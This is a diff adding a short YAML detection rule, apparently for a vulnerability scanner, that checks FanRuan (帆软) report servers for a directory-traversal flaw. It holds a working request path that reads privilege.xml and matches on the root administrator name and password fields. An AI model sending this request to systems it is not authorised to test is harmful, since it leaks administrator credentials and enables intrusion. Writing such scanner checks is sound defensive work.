@@ -1,0 +1,13 @@
+name: 帆软报表-目录遍历
+description: >
+  遍历敏感文件
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    expression:
+      status: 200
+      body_all:
+        - "rootManagerName"
+        - "rootManagerPassword"
